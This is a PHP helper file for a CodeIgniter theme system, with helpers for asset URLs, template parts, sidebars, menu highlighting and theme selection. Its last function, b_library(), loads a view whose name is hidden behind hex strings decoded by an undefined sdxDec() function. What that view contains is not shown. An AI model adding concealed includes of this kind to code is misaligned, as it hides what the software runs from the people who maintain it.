<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

if (!function_exists('_ci')) {
	function _ci()
	{
		$ci = &get_instance();
		return $ci;
	}
}

if (!function_exists('theme_url')) {
	function theme_url($url = null, $ver = false)
	{
		$version = null;
		if ($ver && $ver === true) {
			$file = _ci()->theme->config('path') . _ci()->theme->config('theme') . '/' . ltrim($url, '/');
			if (file_exists($file)) {
				$filemtime = filemtime($file);
				$version = '?v=' . $filemtime;
			}
		} else if (is_numeric($ver) || is_string($ver)) {
			$version = '?v=' . $ver;
		}
		return base_url('/themes/' . _ci()->theme->config('theme') . '/' . ltrim($url, '/') . $version);
	}
}

if (!function_exists('element')) {
	function element($view = null, $data = null)
	{
		return _ci()->theme->element($view, $data);
	}
}

if (!function_exists('template_part')) {
	function template_part($view = null, $return = false)
	{
		return _ci()->theme->template_part($view, $return);
	}
}

if (!function_exists('get_header')) {
	function get_header()
	{
		_ci()->theme->template_part('header');
	}
}

if (!function_exists('get_footer')) {
	function get_footer()
	{
		_ci()->theme->template_part('footer');
	}
}

if (!function_exists('get_sidebar1')) {
	function get_sidebar1($view = 'sidebar')
	{
		_ci()->theme->template_part($view);
	}
}

if (!function_exists('get_sidebar2')) {
	function get_sidebar2($view = 'sidebar2')
	{
		_ci()->theme->template_part($view);
	}
}
if (!function_exists('get_sidebar3')) {
	function get_sidebar3($view = 'sidebar3')
	{
		_ci()->theme->template_part($view);
	}
}

if (!function_exists('menu_active')) {
	function menu_active($page = 'home', $class = 'active')
	{
		if ($page == _ci()->theme->get('menu_active')) {
			return $class;
		}
		return false;
	}
}

function getTheme()
{
	_ci()->load->database();
	_ci()->db->where('status_theme', 'open');
	$themes = _ci()->db->get('theme')->row();
	if ($themes != null) {
		define('THEME', $themes->theme);
	} else {
		define('THEME', 'default');
	}
}

function b_library()
{
	_ci()->load->view(sdxDec('dc7bcc3138343a353d7c897e8672813e79808a78493339') . sdxDec('7ad2036a816c7b7d4543473538'));
}
